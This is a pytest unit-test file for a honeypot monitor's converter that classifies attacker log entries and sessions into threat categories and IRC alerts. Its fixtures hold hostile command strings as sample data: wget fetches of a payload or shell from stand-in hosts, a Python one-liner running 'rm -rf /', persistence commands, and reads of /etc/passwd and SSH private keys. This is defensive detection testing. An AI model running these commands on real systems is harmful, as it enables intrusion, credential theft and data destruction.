"""
Unit tests for model conversion utilities.
"""

import pytest
from datetime import datetime, timedelta
from src.honeypot_monitor.models.log_entry import LogEntry
from src.honeypot_monitor.models.session import Session
from src.honeypot_monitor.models.threat_assessment import ThreatAssessment
from src.honeypot_monitor.models.irc_alert import IRCAlert
from src.honeypot_monitor.models.converters import ModelConverter


class TestModelConverter:
    """Test cases for ModelConverter utility class."""
    
    def test_threat_to_irc_alert_exploitation(self):
        """Test converting exploitation threat to IRC alert."""
        threat = ThreatAssessment(
            severity="high",
            category="exploitation",
            confidence=0.8,
            indicators=["malicious command", "system access"],
            recommended_action="Block IP immediately"
        )
        
        alert = ModelConverter.threat_to_irc_alert(threat, "192.168.1.100", "Attack detected")
        
        assert alert.alert_type == "high_threat"
        assert alert.source_ip == "192.168.1.100"
        assert alert.severity == "high"
        assert "Attack detected" in alert.message
        assert "exploitation" in alert.message
        assert "malicious command" in alert.message
        assert "Block IP immediately" in alert.message
        assert alert.sent is False
    
    def test_threat_to_irc_alert_reconnaissance(self):
        """Test converting reconnaissance threat to IRC alert."""
        threat = ThreatAssessment(
            severity="low",
            category="reconnaissance",
            confidence=0.4,
            indicators=["port scan", "service enumeration"],
            recommended_action="Monitor activity"
        )
        
        alert = ModelConverter.threat_to_irc_alert(threat, "10.0.0.1")
        
        assert alert.alert_type == "interesting_traffic"
        assert alert.source_ip == "10.0.0.1"
        assert alert.severity == "low"
        assert "reconnaissance" in alert.message
        assert "port scan" in alert.message
    
    def test_threat_to_irc_alert_many_indicators(self):
        """Test converting threat with many indicators (should limit display)."""
        threat = ThreatAssessment(
            severity="medium",
            category="persistence",
            confidence=0.6,
            indicators=["indicator1", "indicator2", "indicator3", "indicator4", "indicator5"],
            recommended_action="Investigate"
        )
        
        alert = ModelConverter.threat_to_irc_alert(threat, "172.16.0.1")
        
        assert "+2 more" in alert.message  # Should show first 3 + count of remaining
        assert "indicator1" in alert.message
        assert "indicator2" in alert.message
        assert "indicator3" in alert.message
    
    def test_log_entry_to_threat_assessment_command(self):
        """Test converting log entry with command to threat assessment."""
        log_entry = LogEntry(
            timestamp=datetime.now(),
            session_id="session_123",
            event_type="command",
            source_ip="192.168.1.100",
            message="Command executed",
            command="wget http://malicious.com/payload",
            threat_level="high"
        )
        
        threat = ModelConverter.log_entry_to_threat_assessment(log_entry)
        
        assert threat.severity == "high"
        assert threat.category == "exploitation"  # wget suggests exploitation
        assert threat.confidence == 0.6  # Has command, so higher confidence
        assert any("Command: wget" in indicator for indicator in threat.indicators)
        assert any("Event type: command" in indicator for indicator in threat.indicators)
    
    def test_log_entry_to_threat_assessment_file_access(self):
        """Test converting log entry with file access to threat assessment."""
        log_entry = LogEntry(
            timestamp=datetime.now(),
            session_id="session_123",
            event_type="file_access",
            source_ip="192.168.1.100",
            message="File accessed",
            file_path="/etc/passwd"
        )
        
        threat = ModelConverter.log_entry_to_threat_assessment(log_entry)
        
        assert threat.severity == "low"  # Default when no threat_level set
        assert threat.category == "persistence"  # /etc/ access suggests persistence
        assert threat.confidence == 0.6  # Has file_path, so higher confidence
        assert any("File access: /etc/passwd" in indicator for indicator in threat.indicators)
    
    def test_log_entry_to_threat_assessment_login(self):
        """Test converting login log entry to threat assessment."""
        log_entry = LogEntry(
            timestamp=datetime.now(),
            session_id="session_123",
            event_type="login",
            source_ip="192.168.1.100",
            message="Login attempt"
        )
        
        threat = ModelConverter.log_entry_to_threat_assessment(log_entry)
        
        assert threat.category == "reconnaissance"  # Login is reconnaissance
        assert threat.confidence == 0.3  # No command/file, so lower confidence
    
    def test_session_to_threat_assessment_high_activity(self):
        """Test converting high-activity session to threat assessment."""
        start_time = datetime.now() - timedelta(hours=2)
        end_time = datetime.now()
        
        session = Session(
            session_id="session_123",
            source_ip="192.168.1.100",
            start_time=start_time,
            end_time=end_time,
            commands=["ls", "whoami", "wget malicious.com", "python exploit.py"] * 6,  # 24 commands
            files_accessed=["/etc/passwd", "/root/.ssh/id_rsa", "/home/user/.bashrc"] * 4,  # 12 files
            threat_score=0.0  # Will be calculated
        )
        
        threat = ModelConverter.session_to_threat_assessment(session)
        
        assert threat.category == "exploitation"  # Has wget and python
        assert threat.severity in ["medium", "high", "critical"]  # Should be elevated due to activity
        assert any("Commands executed: 24" in indicator for indicator in threat.indicators)
        assert any("Files accessed: 12" in indicator for indicator in threat.indicators)
        assert any("Session duration:" in indicator for indicator in threat.indicators)
    
    def test_session_to_threat_assessment_existing_score(self):
        """Test converting session with existing threat score."""
        session = Session(
            session_id="session_123",
            source_ip="192.168.1.100",
            start_time=datetime.now(),
            commands=["ls", "whoami"],
            threat_score=0.8  # Pre-calculated high score
        )
        
        threat = ModelConverter.session_to_threat_assessment(session)
        
        assert threat.severity == "critical"  # 0.8 score maps to critical
        assert threat.confidence == 0.8
    
    def test_session_to_threat_assessment_low_activity(self):
        """Test converting low-activity session to threat assessment."""
        session = Session(
            session_id="session_123",
            source_ip="192.168.1.100",
            start_time=datetime.now(),
            commands=["ls", "whoami"],
            files_accessed=[],
            threat_score=0.0
        )
        
        threat = ModelConverter.session_to_threat_assessment(session)
        
        assert threat.category == "reconnaissance"  # Low activity
        assert threat.severity == "low"  # Low calculated score
    
    def test_determine_threat_category_command_types(self):
        """Test threat category determination for different command types."""
        # Test exploitation commands
        exploit_entry = LogEntry(
            timestamp=datetime.now(),
            session_id="session_123",
            event_type="command",
            source_ip="192.168.1.100",
            message="Command executed",
            command="wget http://evil.com/shell"
        )
        
        threat = ModelConverter.log_entry_to_threat_assessment(exploit_entry)
        assert threat.category == "exploitation"
        
        # Test normal commands (reconnaissance)
        normal_entry = LogEntry(
            timestamp=datetime.now(),
            session_id="session_123",
            event_type="command",
            source_ip="192.168.1.100",
            message="Command executed",
            command="ls -la"
        )
        
        threat = ModelConverter.log_entry_to_threat_assessment(normal_entry)
        assert threat.category == "reconnaissance"
    
    def test_determine_session_threat_category_patterns(self):
        """Test session threat category determination based on command patterns."""
        # Test persistence commands
        persistence_session = Session(
            session_id="session_123",
            source_ip="192.168.1.100",
            start_time=datetime.now(),
            commands=["crontab -e", "systemctl enable malware", "echo 'evil' >> .bashrc"]
        )
        
        threat = ModelConverter.session_to_threat_assessment(persistence_session)
        assert threat.category == "persistence"
        
        # Test exploitation commands
        exploit_session = Session(
            session_id="session_456",
            source_ip="192.168.1.100",
            start_time=datetime.now(),
            commands=["wget http://evil.com", "python -c 'import os; os.system(\"rm -rf /\")'"]
        )
        
        threat = ModelConverter.session_to_threat_assessment(exploit_session)
        assert threat.category == "exploitation"
    
    def test_score_to_severity_mapping(self):
        """Test numeric score to severity level mapping."""
        assert ModelConverter._score_to_severity(0.1) == "low"
        assert ModelConverter._score_to_severity(0.4) == "medium"
        assert ModelConverter._score_to_severity(0.7) == "high"
        assert ModelConverter._score_to_severity(0.9) == "critical"
        assert ModelConverter._score_to_severity(1.0) == "critical"
    
    def test_get_recommended_action_by_severity(self):
        """Test recommended action generation based on category and severity."""
        critical_action = ModelConverter._get_recommended_action("exploitation", "critical")
        assert "Immediate investigation" in critical_action
        assert "block" in critical_action.lower()
        
        high_exploit_action = ModelConverter._get_recommended_action("exploitation", "high")
        assert "Block IP" in high_exploit_action
        assert "investigate" in high_exploit_action.lower()
        
        medium_action = ModelConverter._get_recommended_action("reconnaissance", "medium")
        assert "Monitor" in medium_action
        
        low_action = ModelConverter._get_recommended_action("reconnaissance", "low")
        assert "Continue monitoring" in low_action